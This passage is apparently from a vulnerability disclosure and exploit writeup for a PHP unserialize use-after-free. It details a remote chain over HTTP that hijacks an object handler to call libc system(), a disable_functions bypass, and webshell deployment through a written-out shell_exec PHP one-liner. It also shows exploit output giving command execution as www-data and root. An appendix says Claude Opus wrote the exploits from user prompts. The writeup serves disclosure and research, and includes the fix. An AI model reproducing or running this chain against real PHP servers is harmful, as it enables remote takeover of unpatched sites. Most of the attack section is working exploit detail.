The local exploit calls `zif_system` through the Zend VM, which passes arguments via `zend_execute_data`, a structured frame containing the PHP-level arguments. The remote exploit's code execution path is fundamentally different: `get_properties_for` is a C function pointer called directly with `(zend_object *obj, zend_prop_purpose purpose)`. There is no `zend_execute_data` frame.

If we pointed `get_properties_for` at `zif_system`, it would interpret the `zend_object*` as a `zend_execute_data*`, read garbage as the argument count and parameter array, and crash. We need a function with the standard C ABI that treats its first argument as a string: `int system(const char *command)`. When called as `get_properties_for(obj, purpose)`, `rdi = obj`, and `system()` reads the bytes at that address as the command.

This is why the remote exploit resolves `system()` from **libc's `.gnu_hash`** (Phase 3.5) rather than using the PHP-level `zif_system` from `function_table`.

## The Serialize Dispatch Path

When `serialize()` encounters a zval of type IS_OBJECT, it follows this path in `php_var_serialize_intern()` (`ext/standard/var.c`):

```c
case IS_OBJECT:
    ce = Z_OBJCE_P(struc);           // read obj->ce
    if (ce->__serialize) { ... }      // check for __serialize magic
    else if (ce->serialize) { ... }   // check for Serializable::serialize
    else {
        // Default object serialization - the path we exploit
        php_var_serialize_class_name(buf, struc);
        props = zend_get_properties_for(struc, ZEND_PROP_PURPOSE_SERIALIZE);
        //      ↑ dispatches through handlers vtable
        php_var_serialize_properties(buf, props, struc);
    }
```

Before reaching this code, `php_var_serialize_intern` calls `php_add_var_hash()` to track the object in the serializer's reference table. This calls `GC_ADDREF(obj)`, incrementing the uint32 at `obj+0x00`. This detail matters, see [The GC_ADDREF Corruption Problem](#the-gc_addref-corruption-problem) below.

The `zend_get_properties_for` function reads the vtable:

```c
// Zend/zend_object_handlers.c
ZEND_API HashTable *zend_get_properties_for(zval *obj, zend_prop_purpose purpose)
{
    zend_object *zobj = Z_OBJ_P(obj);
    zend_object_handlers *handlers = zobj->handlers;
    if (handlers->get_properties_for) {
        return handlers->get_properties_for(zobj, purpose);
        //     ↑ indirect call through vtable - we control this pointer
    }
    ...
}
```

The compiled code for the indirect call is typically:

```asm
mov    rdi, zobj           ; first arg = object pointer
mov    esi, purpose        ; second arg = enum value
mov    rax, [handlers+0xC8] ; load get_properties_for function pointer
call   *rax                ; or: jmp *rax (tail call optimization)
```

When `[handlers+0xC8]` points to libc `system()`, this becomes `system(zobj)`, and `zobj` points to our fake object where the first bytes are the command string.

## The zend_object_handlers Vtable

`zend_object_handlers` is a struct of function pointers, the object-oriented vtable of the Zend engine. Every object's `handlers` field points to one of these. The relevant portion:

```
zend_object_handlers:
  +0x00: offset                (size_t)
  +0x08: free_obj              (void (*)(zend_object*))
  +0x10: dtor_obj              (void (*)(zend_object*))
  +0x18: clone_obj             (zend_object* (*)(zend_object*))
  ...
  +0xB8: get_properties        (HashTable* (*)(zend_object*))
  +0xC0: get_debug_info        (HashTable* (*)(zend_object*, int*))
  +0xC8: get_properties_for    (HashTable* (*)(zend_object*, zend_prop_purpose))
  +0xD0: get_gc                (HashTable* (*)(zend_object*, zval**, int*))
  ...
```

The `get_properties_for` slot at `+0xC8` was introduced in PHP 7.4. For `std_object_handlers` (the default handlers used by stdClass), this slot is NULL, meaning `zend_get_properties_for` falls through to a default implementation. But we control the entire handlers vtable: we place the fake vtable at the start of the spray string and set `spray[0xC8] = system()`.

## Spray Content Layout

The remote exploit packs three overlapping structures into a single 280-byte spray string. The string's content address `S` is known from Phase 8 (ZMM chunk metadata scan):

```
S+0     ┌─────────────────────────────────────────┐
        │  Fake handlers vtable (200 bytes)        │
        │                                          │
        │  Most slots: 0x00 (NULL - never reached) │
S+0xC8  │  [200]: get_properties_for = system()    │ ← the controlled pointer
        └─────────────────────────────────────────┘

S+0x28  ┌─────────────────────────────────────────┐
        │  Bucket[0] zval (type confusion target)  │
        │  [0x28..0x2F]: value = S+104 (fake obj)  │
        │  [0x30..0x33]: type_info = 0x08 (OBJECT) │
        └─────────────────────────────────────────┘

S+104   ┌─────────────────────────────────────────┐
        │  Fake zend_object                        │
        │  obj+0x00: "\x09id>/dev/shm/x\0"        │ ← command string = gc header
        │  obj+0x10: ce = stdClass ce              │ ← from class_table lookup
        │  obj+0x18: handlers = S                  │ ← points to spray start
        │  obj+0x20: properties = 1                │ ← non-NULL (see below)
        └─────────────────────────────────────────┘
```

All three structures fit within 280 bytes without overlapping each other. The Bucket[0] region (S+0x28..S+0x33) is between the vtable's unused slots and the fake object.

### type_info = 0x08 vs 0x0308

A key difference from the local exploit: the remote spray uses `type_info = 0x08` (bare IS_OBJECT) without the IS_TYPE_REFCOUNTED flag (`0x0300`). In the local exploit, IS_TYPE_REFCOUNTED is needed because the Zend VM's variable handling code checks refcount flags. In the remote exploit, the IS_OBJECT zval only appears in the serialized output path, `php_var_serialize_intern` switches on the type field (low byte) and doesn't check refcount flags before dispatching.

Using bare `0x08` instead of `0x0308` has a GC safety advantage: when `var_destroy` runs after `unserialize()` completes, it calls `zval_ptr_dtor` on each var_hash entry. With IS_TYPE_REFCOUNTED clear, `zval_ptr_dtor` is a no-op for this slot, no `GC_DELREF` on the fake object, no risk of a second `dtor_obj` call.

### Why properties Must Be Non-NULL

The `php_var_serialize_intern` IS_OBJECT path has an optimization: if the object has no properties hash table (`properties == NULL`) and no dynamic properties, it can skip `zend_get_properties_for` entirely and use an inline property-table walk. Setting `properties = 1` (any non-NULL value) forces the code down the `zend_get_properties_for` path where our vtable hijack lives.

### Why stdClass?

The fake object's `ce` must point to a real `zend_class_entry` that satisfies two conditions in the serialize path:

1. `ce->__serialize == NULL`, otherwise serialize calls the `__serialize` magic method (which would crash or take the wrong path)
2. `ce->serialize == NULL`, otherwise serialize calls `Serializable::serialize()` (wrong path)

`stdClass` satisfies both: it has no magic methods and no Serializable implementation. It's resolved dynamically from `EG.class_table` via DJBX33A hash lookup for `"stdclass"` (PHP stores class names lowercase):

```python
# Read class_table HashTable via malloc header trick
r = isstring_read(class_table - 0x18)
# Extract nTableMask, arData, nNumUsed
# DJBX33A hash lookup for "stdclass"
h = php_djb_hash(b"stdclass")
# Walk hash chain, verify key string via isstring_read
# → stdClass ce pointer
```

## Full Dispatch Trace

The complete execution path from `serialize()` to shell command, with addresses from a real run:

```
serialize($result)
  │
  ├─ php_var_serialize_intern(result[33])
  │    type = IS_OBJECT (from spray Bucket[0])
  │    obj = S+104 (0x7e46ede758d8 + 104 = 0x7e46ede75940)
  │
  ├─ php_add_var_hash(obj)
  │    GC_ADDREF(obj)  →  obj[0x00]++ → "\x09" becomes "\x0A"
  │    command string is now "\nid>/dev/shm/x\0"
  │
  ├─ Z_OBJCE_P → obj->ce at obj+0x10 → stdClass ce (0x5b35c7d67870)
  │    ce->__serialize == NULL  ✓  (not a __serialize class)
  │    ce->serialize == NULL    ✓  (not a Serializable class)
  │
  ├─ zend_get_properties_for(obj, ZEND_PROP_PURPOSE_SERIALIZE)
  │    zobj = obj (0x7e46ede75940)
  │    handlers = obj->handlers at obj+0x18 → S (0x7e46ede758d8)
  │    get_properties_for = handlers[0xC8] → S+200 → libc system()
  │
  ├─ handlers->get_properties_for(zobj, purpose)
  │    = system(zobj)
  │    = system(0x7e46ede75940)
  │    reads string at 0x7e46ede75940: "\nid>/dev/shm/x\0"
  │
  └─ /bin/sh -c "\nid>/dev/shm/x"
       shell ignores leading newline, executes: id>/dev/shm/x
       writes "uid=33(www-data) gid=33(www-data)..." to /dev/shm/x
```

After `system()` returns, the serialize path continues but will likely crash (the return value is not a valid `HashTable*`). The Apache worker dies, but the command has already executed. The attacker reads the result via a subsequent HTTP request (either reading `/dev/shm/x` through another vulnerability, or deploying a webshell).

# The GC_ADDREF Corruption Problem

There is a subtle obstacle: `php_add_var_hash()` calls `GC_ADDREF(obj)` before serialization, which increments the uint32 at `obj+0x00`, the first byte of our command string. If the command starts with a printable ASCII character (e.g., `i` from `id`), incrementing it changes the command (e.g., `i` → `j`).

The workaround: start the command with `\x09` (tab). When GC_ADDREF increments byte 0, `\x09` becomes `\x0A` (newline). `system()` treats a leading newline as a no-op, the shell ignores it and executes the rest:

```python
CMD = b"\x09id>/dev/shm/x"   # → after corruption: "\nid>/dev/shm/x"
```

The `\x09 → \x0A` transformation is reliable because GC_ADDREF is a simple `++` on the uint32 at obj+0x00, it increments the **first byte** by 1 (little-endian, so the low byte of the uint32 is the first byte of the string). Other starting bytes would work if they produce a shell-safe character after increment (e.g., `\x1F` → space), but `\x09` → `\x0A` is the cleanest.

### Why Not Start With \x0A Directly?

If we place `\x0A` (`\n`) as the first byte, GC_ADDREF increments it to `\x0B` (vertical tab). While some shells treat `\x0B` as whitespace, it's not universally safe. The `\x09 → \x0A` path is guaranteed: `\n` is a POSIX-defined line separator that every shell handles identically.

## The 14-Byte Command Limit

The command string occupies the fake `zend_object`'s `gc` header area (obj+0x00 through obj+0x0F). The `ce` pointer at obj+0x10 is a required 8-byte non-ASCII value (a kernel-space-like address), and `system()` reads until the first null byte. A null terminator must appear at or before obj+0x0F to prevent `system()` from reading into the `ce` pointer (which would produce garbage shell syntax and fail).

With the leading `\x09` occupying byte 0, this gives **14 usable bytes** (obj+0x01 through obj+0x0E) plus the null terminator at obj+0x0F. The total command including the `\x09` prefix is 15 bytes, but after GC_ADDREF converts it to `\x0A`, the shell sees 14 bytes of actual command after the leading newline.

# Webshell Deployment and Interactive Access

14 bytes is enough for `sh /dev/shm/s` (13 chars), which executes a pre-staged shell script. The `--shell` mode:

1. Writes a shell script to `/dev/shm/s` that creates a PHP webshell in the DocumentRoot:
   ```sh
   #!/bin/sh
   echo '<?php echo shell_exec($_GET["c"]); ?>' > /path/to/webroot/c.php
   ```
2. Triggers the exploit with command `\x09sh /dev/shm/s`
3. Apache (www-data) creates `c.php` in the DocumentRoot
4. Provides an interactive shell loop via HTTP GET requests to the webshell

`/dev/shm` is always writable by www-data and is **not** affected by systemd's `PrivateTmp=true` (which isolates `/tmp` but not `/dev/shm`).

# Full Chain (Remote)

```
Python exploit                           Docker: php:8.5-apache (prefork)
──────────────                           ───────────────────────────────

Phase 1: Heap leak (1 request)
  POST cook=a:34:{C:...;s:280:"<IS_LONG spray>";...R:4;...R:11;}
  ← serialize output with zend_reference* in modified spray
  → heap_ref, chunk_base

Phase 2: ELF scan (~30-60 requests)
  for each 2MB-aligned addr near chunk:
    POST <IS_STRING spray pointing at candidate+0x10>
    ← len=64 + ELF header fields → identify ELF images
  → elf_candidates[] = [(libphp, 10), ...]

Phase 2.5: Fine-grained scan (~20-60 requests)
  1MB-step scan near highest-phnum ELF
  catches non-2MB-aligned DSOs

Phase 3: libphp symbol resolution (~10 requests)
  read phdr fields → 2MB ELF window (via p_align = 0x200000)
  parse PT_DYNAMIC → DT_SYMTAB, DT_STRTAB, DT_GNU_HASH, DT_PLTGOT
  .gnu_hash lookup: executor_globals, compiler_globals, std_object_handlers
  → EG address, PLTGOT address, PT_DYNAMIC address

Phase 3.5: libc discovery (~1500-2000 requests)
  read .dynamic via d_val anchor → extract DT_PLTRELSZ, DT_PLTGOT
  isstring_read with DT_PLTRELSZ as len → 83KB GOT dump
  extract 24 external pointer groups (18 nearby libphp)
  for each nearby pointer:
    search backward for ELF header (e_phnum >= 12 = libc)
    resolve 'system' from libc's .gnu_hash
  → libc system() address

Phase 4: Read EG globals (~50 requests)
  scan BSS near EG for non-zero len anchor
  read function_table (EG+0x1C8) and class_table (EG+0x1D0)
  → function_table ptr, class_table ptr

Phase 5: HT lookup for "system" (~5 requests)
  read function_table HashTable via malloc header
  read HT arData via malloc header
  DJBX33A hash → bucket chain → find "system" entry
  → zend_internal_function* for system()

Phase 6: Read handler (1 request)
  read zend_internal_function via malloc header
  → zif_system handler (verification - confirms correct function)

Phase 7: system() already resolved from libc in Phase 3.5

Phase 8: Spray slot discovery (~10 requests)
  read chunk metadata (heap.size as len anchor)
  parse page_map for SRUN bin=16 (bin-320) pages
  probe slots for len=280 strings
  → S = spray_slot + 0x18

Phase 9: RCE trigger (1 request)
  resolve stdClass ce from class_table
  build RCE spray:
    spray[0x28]: Bucket[0] = IS_OBJECT → fake obj at S+104
    spray[104]: fake zend_object (cmd + ce + handlers=S)
    spray[200]: get_properties_for = libc system()
  POST <RCE spray with R:4>
  → serialize() → get_properties_for(obj) → system("\nid>/dev/shm/x")

    ┌──────────────────────────────────────────────────┐
    │ uid=33(www-data) gid=33(www-data) groups=33(www-data)  │
    └──────────────────────────────────────────────────┘

  ~2,000 total requests, zero hardcoded offsets
```

---

# Exploit Output

## Local Exploit: disable_functions Bypass

With `disable_functions=system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec` in `php.ini`:

```
$ php -d 'disable_functions=system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec' \
    local_exploit.php

=== PHP Serializable var_hash UAF → RCE (generic, no hardcoded offsets) ===
[*] Phase 1: Heap address leak via R: write-through...
[+] zend_reference @ 0x7d16e26b4d00
[*] Phase 2: Finding object pointers (ce, handlers) in heap...
[+] Found 2 object groups, best: count=257 ce=0x61a5ec3c94d0 handlers=0x61a5e02e1d80
[*] Phase 3: Finding function_table HT near handlers...
[+] function_table @ 0x61a5ec389300 (nNumUsed=1205, delta=0xe0, ft_off=+0x1c8)
[*] Phase 4: Finding symbol_table...
[+] EG @ 0x61a5e02e1e60 (ft_off=+0x1c8), symbol_table @ 0x61a5e02e1f90 (nNumUsed=264)
[*] Phase 5: Resolving system()...
[!] system() is in disable_functions: system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec
[*] Bypassing: resolving zif_system from module function entry table...
[+] standard module @ 0x61a5e02c2020 (via var_dump)
[+] module functions @ 0x61a5e01f68e0
[+] zif_system (from module) @ 0x61a5debfb960
[*] Phase 6: Building fake zend_closure...
[*] Phase 7: Walking symbol table for string address...
[+] Fake closure @ 0x7d16e2682798
[*] Phase 8: Triggering IS_OBJECT type confusion...
[+] Got fake Closure!
──────────────────────────────────────────────────
uid=0(root) gid=0(root) groups=0(root)
Linux db5f9c147fb7 6.8.0-110-generic ... x86_64 GNU/Linux
──────────────────────────────────────────────────
[+] Exploit complete.
```

The key difference: Phase 5 detects that `system()` is disabled, navigates to the standard module's static function entry table via `var_dump`'s module pointer, walks 286 entries to find `system`, and reads the original `zif_system` handler, bypassing the runtime disable entirely.

## Remote Exploit

```
$ python3 test_full_chain.py

============================================================
  Full chain: heap → ELF → CG → system() → RCE
  Target: 127.0.0.1:8081
============================================================
[Phase 1] Heap leak
  heap_ref = 0x7e46ede581e0
[Phase 2] ELF scan (2MB aligned, near heap)
  ELF @ 0x7e46ef800000 phnum=10 (28 reqs)
[Phase 2.5] Fine-grained scan near 0x7e46ef800000
[Phase 3] Symbol resolution
  Trying ELF @ 0x7e46ef800000 (phnum=10)
    executor_globals = 0x7e46f0f72560 (offset 0x1772560)
    compiler_globals = 0x7e46f0f72d20 (offset 0x1772d20)
    std_object_handlers = 0x7e46f0e8a000 (offset 0x168a000)
    PLTGOT = 0x7e46f0e8bfe8
  libc not in 2MB scan -- discovering via link_map / data segment
    GOT read: len=82872, got 82872 bytes
    External pointer groups: 24 total, 18 nearby
    [libc @ 0x7e46f12db000 phnum=15]
    system() = 0x7e46f132e110
[Phase 4] Read EG.function_table
  function_table = 0x5b35c7c8fd70
  class_table    = 0x5b35c7c8fdb0
[Phase 5] HT lookup for 'system'
  FOUND 'system' at bucket[678]!
  zend_internal_function @ 0x5b35c7d2b740
[Phase 6] Read zif_system handler
  zif_system handler = 0x7e46efd70de0 (elf+0x570de0)
[Phase 7] system() = 0x7e46f132e110 (resolved from libc)
[Phase 8] Find spray slot via chunk metadata
  Found spray at slot 7 @ 0x7e46ede758c0
  S = 0x7e46ede758d8
[Phase 9] RCE trigger
  stdClass ce = 0x5b35c7d67870
  Sending RCE payload...
============================================================
  RCE SUCCESS! /dev/shm/x exists
  Content: uid=33(www-data) gid=33(www-data) groups=33(www-data)
============================================================
[*] Total requests: 2150
```

The remote exploit resolves `system()` from libc's `.gnu_hash` rather than using the module function entry table bypass, `disable_functions` only affects the PHP runtime, and the remote exploit calls libc `system()` directly via the `get_properties_for` handler pointer in the fake object, never going through PHP's function dispatch.

---

# Part III: Analysis

# Reliability

10/10 successful runs under full ASLR on both PHP 8.4.19 and PHP 8.5.5 (NTS, x86_64 Linux):

## PHP 8.4.19

```
Run  Heap Leak          handlers           function_table     zif_system
───  ─────────────────  ─────────────────  ─────────────────  ─────────────────
 1   0x750517ea4400     0x578b7a217a20     0x578ba827c6d0     0x578b79b7d6c0
 2   0x7900ee0a4400     0x64a9fe017a20     0x64aa024166d0     0x64a9fd97d6c0
 3   0x7ea7214a4400     0x5eea13217a20     0x5eea3681d6d0     0x5eea12b7d6c0
 4   0x7cfd7c8a4400     0x55719a017a20     0x5571c92d36d0     0x55719997d6c0
 5   0x7263460a4400     0x559938617a20     0x5599527c36d0     0x559937f7d6c0
 6   0x7a0fb56a4400     0x62061f617a20     0x62062e5576d0     0x62061ef7d6c0
 7   0x7c9c2daa4400     0x627283817a20     0x62728a1576d0     0x62728317d6c0
 8   0x77cf45aa4400     0x5950bea17a20     0x5950fe1816d0     0x5950be37d6c0
 9   0x75c6e20a4400     0x60f495c17a20     0x60f4a118d6d0     0x60f49557d6c0
10   0x73c67baa4400     0x5b5e80817a20     0x5b5eb81596d0     0x5b5e8017d6c0
```

## PHP 8.5.5

```
Run  Heap Leak          handlers           function_table     zif_system
───  ─────────────────  ─────────────────  ─────────────────  ─────────────────
 1   0x729660ab6460     0x5db61d8d73c0     0x5db625d906d0     0x5db61ccb8c90
 2   0x76753e4b6460     0x6063aa6d73c0     0x6063c66356d0     0x6063a9ab8c90
 3   0x758c0eeb6460     0x605179cd73c0     0x60517d0696d0     0x6051790b8c90
 4   0x7de0a16b6460     0x5b757b0d73c0     0x5b75a843b6d0     0x5b757a4b8c90
 5   0x781e010b6460     0x5574aa0d73c0     0x5574d5da26d0     0x5574a94b8c90
 6   0x7434de2b6460     0x57ba116d73c0     0x57ba200036d0     0x57ba10ab8c90
 7   0x7e0bc38b6460     0x58e7012d73c0     0x58e734c886d0     0x58e7006b8c90
 8   0x761a3e6b6460     0x5ef5a3ed73c0     0x5ef5d6a6a6d0     0x5ef5a32b8c90
 9   0x72a6c8ab6460     0x5a869d4d73c0     0x5a86dbab16d0     0x5a869c8b8c90
10   0x783df4ab6460     0x60f5b0ad73c0     0x60f5be7186d0     0x60f5afeb8c90
```

Every address is different (ASLR), every run succeeds. No hardcoded offsets, the exploit discovers all addresses at runtime.

## Docker Remote (php:8.5-apache)

3/3 successful runs against Docker `php:8.5-apache` with full ASLR (container restart between each run):

```
Run  heap_ref           libphp             libc system()      Requests
───  ─────────────────  ─────────────────  ─────────────────  ────────
 1   0x7cff8be581e0     0x7cff8da00000     0x7cff8f3c4110     2150
 2   0x7b596a0581e0     0x7b596a800000     0x7b596f2f4110     2150
 3   0x7386fba581e0     0x7386fc600000     0x7386fe15d110     2183
```

Every run finds libphp via 2MB-aligned scan, discovers libc through the GOT pointer chain, resolves `system()` from libc's `.gnu_hash`, and achieves RCE as `www-data`.

# Affected Versions

## Root Cause Timeline

The vulnerability exists in every PHP version that has both the `Serializable` interface and the `BG(serialize_lock)` convention:

| Version | Status |
|---------|--------|
| **PHP 5.1** | `Serializable` interface introduced. The `serialize_lock` mechanism did not exist yet, the bug is latent but the guard that *should* protect against it hasn't been added, so the shared var_hash is exploitable via different shapes. |
| **PHP 5.6** | `BG(serialize_lock)` convention hardened around `__wakeup` dispatches. `zend_user_unserialize()` was **not** updated, the root cause crystallizes here. |
| **PHP 7.0–7.3** | Vulnerable. `Serializable` fully supported, `serialize_lock` present but not applied in `zend_user_unserialize`. |
| **PHP 7.4** | `__serialize()`/`__unserialize()` magic methods added as the replacement API. `Serializable` still fully functional. Vulnerable. |
| **PHP 8.0** | Vulnerable. Union types and JIT added but `zend_user_unserialize` unchanged. |
| **PHP 8.1** | `Serializable` soft-deprecated, emits `E_DEPRECATED` if a class implements `Serializable` without also implementing `__serialize()`/`__unserialize()`. The `C:` format and `zend_user_unserialize` dispatch path remain fully functional. Vulnerable. |
| **PHP 8.2–8.3** | Vulnerable. No changes to the affected code path. |
| **PHP 8.4** | Vulnerable. Tested and confirmed exploitable (8.4.19 NTS). |
| **PHP 8.5** | Vulnerable. `__sleep()`/`__wakeup()` soft-deprecated. `Serializable` still works. Tested through 8.5.5. |
| **PHP 9.0** (future) | `Serializable` interface will be removed. `unserialize()` will reject `C:` format payloads entirely. This **implicitly eliminates** the bug by removing the code path, not by fixing the root cause. |

**Summary:** Every PHP release from 5.1 through 8.5.x is affected. The `zend_user_unserialize` function in `Zend/zend_interfaces.c` has never been patched.

## CVE Status

**No CVE has been assigned** for this specific bug (missing `BG(serialize_lock)++` in `zend_user_unserialize`).

A related predecessor, **CVE-2015-6834**, was reported by Taoguang Chen and fixed specific exploitation vectors in SPL classes (`SplObjectStorage`, `SplDoublyLinkedList`) via PHP bugs [#70172](https://bugs.php.net/bug.php?id=70172), [#70365](https://bugs.php.net/bug.php?id=70365), [#70366](https://bugs.php.net/bug.php?id=70366), and [#70436](https://bugs.php.net/bug.php?id=70436). That fix tightened individual call sites but **did not address the root cause**, `zend_user_unserialize` still does not increment `serialize_lock`. The current bug is the same class of issue surviving into modern PHP.

## The Fix

Two lines in `Zend/zend_interfaces.c`:

```c
ZEND_API int zend_user_unserialize(zval *object, zend_class_entry *ce,
                                   const unsigned char *buf, size_t buf_len,
                                   zend_unserialize_data *data)
{
    zval zdata;
    ZVAL_STRINGL(&zdata, (char*)buf, buf_len);
+   BG(serialize_lock)++;
    zend_call_method_with_1_params(
        Z_OBJ_P(object), Z_OBJCE_P(object),
        NULL, "unserialize", NULL, &zdata);
+   BG(serialize_lock)--;
    zval_ptr_dtor(&zdata);
    ...
}
```

This matches every other user-code dispatch site during unserialization (`__wakeup`, `__unserialize`, `__destruct`). With the lock held, the inner `unserialize()` call creates a fresh var_hash instead of sharing the outer one, preventing R: references from reaching across the boundary.

## Exploit Portability

The generic exploit (`local_exploit.php`) uses **no hardcoded symbol offsets**. All addresses are discovered at runtime via:

1. Heap address leak → ZendMM chunk base
2. Object gc pattern matching → `closure_handlers` and `closure_ce`
3. .bss proximity scan → EG, `function_table`, `symbol_table`
4. DJBX33A hash table lookup → `zif_system`

The only hardcoded values are **struct member offsets** which are stable across PHP 8.0–8.5:

| Offset | Field | Stable Since |
|--------|-------|-------------|
| `+0x10` | `zend_object.ce` | PHP 7.0 |
| `+0x18` | `zend_object.handlers` | PHP 7.0 |
| `+0x38` | `zend_closure.func` | PHP 7.0 |
| `+0x58` | `zend_internal_function.handler` | PHP 7.0 |
| `+0x60` | `zend_internal_function.module` | PHP 7.0 |
| `+0x0C` | `HashTable.nTableMask` | PHP 7.0 |
| `+0x10` | `HashTable.arData` | PHP 7.0 |
| `+0x20` | `zend_module_entry.name` | PHP 5.0 |
| `+0x28` | `zend_module_entry.functions` | PHP 5.0 |
| `+0x130` | `EG.symbol_table` | PHP 8.0 |
| `+0x1b0` / `+0x1c8` | `EG.function_table` | 8.0–8.4 / 8.5+ |

The `disable_functions` bypass adds three offsets (`+0x60`, `+0x20`, `+0x28`) and the `zend_function_entry` stride (0x30 bytes on PHP 8.4+, 0x20 on older versions). All are stable within a major version.

The exploit automatically handles the `function_table` offset change between PHP 8.4 and 8.5 by trying both values and validating the result.

The heap spray geometry (bin-320, 280-byte strings, 8 inner properties + 1 added → 9 entries → 8→16 resize) is stable across all 8.x versions. ZendMM's 2MB chunk alignment is a fundamental design constant.

# Primitives Reference

## Heap Leak: R: Write-Through

- **What:** ZVAL_MAKE_REF writes a `zend_reference*` back to the stale zval location in the reclaimed spray string
- **Gives:** Absolute heap address of a `zend_reference` struct
- **Used for:** ZendMM chunk base calculation (`addr & ~0x1FFFFF`)

## Mega-String: Bulk Heap Read

- **What:** Fake `zend_string` at `chunk - 0x10` with `len = *(chunk+0x00)` (heap pointer, huge)
- **Gives:** 2MB read window over the entire ZendMM chunk via `substr($str, offset, 8)`
- **Used for:** Scanning for zend_object gc patterns to discover binary .bss/.data addresses
- **Key insight:** gc/h fields at `chunk-0x10`/`chunk-0x08` are never accessed for non-refcounted strings

## Per-Read UAF: IS_STRING Type Confusion

- **What:** Spray IS_STRING zval at Bucket[0] pointing to `addr - 0x18 - bias` as fake `zend_string`
- **Gives:** 8 bytes read from `addr` (via `substr($str, bias, 8)`)
- **Bias trick:** Try 8 different bias values so `len` overlaps with non-zero data
- **Used for:** Reading EG fields, hash table walking, symbol resolution, .bss scanning

## Code Execution: IS_OBJECT Type Confusion

- **What:** Spray IS_OBJECT zval at Bucket[0] pointing to fake `zend_closure` data in a PHP string
- **Gives:** The engine treats the stale reference as a live Closure object
- **Used for:** Calling `zif_system` via the fake closure's handler pointer
- **GC safety:** `type_info = 0x0308` (IS_OBJECT | IS_TYPE_REFCOUNTED | IS_TYPE_COLLECTABLE) makes the engine handle the reference normally. The fake object's `gc.refcount = 0x7FFFFFFF` prevents premature collection.

## disable_functions Bypass: Module Function Entry Table Walk

- **What:** Navigate from a non-disabled standard-module function's `zend_internal_function.module` pointer (`+0x60`) to the `zend_module_entry`, then walk the module's static `zend_function_entry[]` array to find the original handler
- **Gives:** The original `zif_system` handler address, even when `system` is in `disable_functions`
- **Used for:** Bypassing `disable_functions`, the runtime copy in `function_table` has a disabled stub, but the compile-time function entry table in `.data.rel.ro` is never modified
- **Key insight:** `zend_disable_function()` only patches the heap-allocated `zend_internal_function` copies, not the source `zend_function_entry[]` in the module's data section

## GOT Dump: DT_PLTRELSZ as IS_STRING Length Anchor

- **What:** Fake `zend_string` where `len` overlaps with the `DT_PLTRELSZ` `d_val` field in libphp's `.dynamic` section (~83KB), data starts 8 bytes later
- **Gives:** ~83KB read covering `.dynamic`, `.got`, and `.got.plt`, containing resolved libc function pointers
- **Used for:** libc discovery without needing to find libc's ELF base first
- **Key insight:** `.dynamic` entries are (d_tag, d_val) pairs; `DT_PLTRELSZ` d_val is the total PLT relocation table size, a moderate integer suitable as IS_STRING length. The `.got.plt` section follows `.dynamic` in the data segment, so the read window covers both.

## var_destroy Safety

After `unserialize()` completes, `var_destroy` iterates all var_hash entries and calls `zval_ptr_dtor` on each. Stale entries now point into spray content, so every bucket must have a GC-safe type:

- **Bucket[0]:** IS_STRING with `type_info=0x06` → `IS_TYPE_REFCOUNTED` is NOT set → `zval_ptr_dtor` is a no-op
- **Bucket[1..7]:** IS_LONG with `type_info=0x04` → non-refcounted → `zval_ptr_dtor` is a no-op

If any bucket had `IS_TYPE_REFCOUNTED` set (bit 2 of the second byte), `zval_ptr_dtor` would attempt `GC_DELREF` at the fake pointer address, causing a segfault.

---

**Tested on:** PHP 8.4.19 (NTS) and PHP 8.5.5 (NTS), Linux x86_64, 6.8.0-110-generic, full ASLR. 10/10 local reliability on both versions. Remote exploit 3/3 on Docker `php:8.5-apache` with container restart between runs (full ASLR re-randomization).

**Local exploit:** `local_exploit.php`, self-contained PHP, zero dependencies, zero /proc access, zero hardcoded offsets. Bypasses `disable_functions` by resolving the original `zif_system` handler from the standard module's static function entry table.
**Remote exploit:** `php8_remote.py`, standalone Python 3, HTTP-only, zero hardcoded offsets, ~2,000 requests to RCE. Tested against Docker `php:8.5-apache` (Debian, jemalloc-backed ZendMM, Apache mod_php prefork).

---

# Appendix: Audit Skill Reference

The skill file is published at [github.com/califio/skills](https://github.com/califio/skills). It's a Claude Code skill: a structured prompt that orchestrates multi-agent source code auditing with a bug taxonomy derived from ~20 historical PHP deserialization advisories.

---

# Appendix: User Prompts

The complete sequence of user prompts that led from initial audit through full local and remote exploitation. The work spanned two Claude Code sessions. All code, the audit skill, the exploits, and this writeup, was generated by Claude Opus in response to these prompts.

## Phase 1: Building the Audit Skill

Prior work in a separate session had reproduced ~20 known PHP 5.x unserialize vulnerabilities from the [phpcodz advisory corpus](https://github.com/80vul/phpcodz) (pch-010 through pch-034), building a `work/` directory with triggers, exploit chains, and version-specific payloads for PHP 5.3–5.6. That session established the exploitation patterns and struct layouts that informed the audit skill design.

The current session began by studying those advisories to extract common vulnerability patterns:

```
can you read the advisories in phpcodz/ related to unserialize
```

```
i would like you to identify the code patterns of these vulnerabilities
and create a SKILL.md which can detect them generically - as well as
possibly other UAF type vulnerabilities in PHP or doublefrees -
zval_ptr_dtor(var) -> zval_ptr_dtor(var) etc etc
```

```
are you sure they are all grepable ? maybe we should use some tips from
the Fbsd-audit-wide skill which gathers context and stores that context
for subagents as well ? then verification via an opus model
```

This produced two skills: `/php-unserialize-audit` (deserialization-specific, U1–U12 taxonomy) and `/php-audit` (general memory-safety, callback reentrancy, sort comparator UAFs, etc.):

```
actually maybe we should split this into a different skill, we can rename
the previous skill to be php-unserialize-audit and this one just php-audit
```

## Phase 2: Discovery

The audit was run against PHP 5.6.40 first (to validate against known bugs), then PHP 8.5:

```
can we run /php-unserialize-audit on the latest 5.6? i think its 5.6.40 ?
```

The audit rediscovered all 12 known phpcodz advisories and flagged M5 (Serializable var_hash sharing) as a new finding. To confirm it survived into modern PHP:

```
can you download the latest 8.x branch and then run the
/php-unserialize-audit on it also
```

## Phase 3: Vulnerability Analysis and Real-World Impact

```
can you write up the notes of this vulnerability in a new .md - could this
be triggered remotely ? are there any built in classes as you mentioned SPL
that would be able to trigger this ?
```

```
so youre sure we cant hit it with default classes only ?
```

```
what is an example of a vulnerable app - aka what is required for an app
to do to make this exploitable
```

```
can you find real examples of this in popular frameworks or apps .. check
github or what ever you need.
```

```
can you find an app which is implementing doctrine1
```

This led to finding ~600K installs of friendsofsymfony1/doctrine1 with Serializable classes, plus Mautic, Way to Health, and other apps with the required pattern.

```
could you setup one of these apps to try and trigger this vulnerability
"remotely" - use a docker if you need for ease of testing it.
```

## Phase 4: Local Exploitation

The initial exploit used `/proc/self/maps` for symbol resolution. The user rejected this:

```
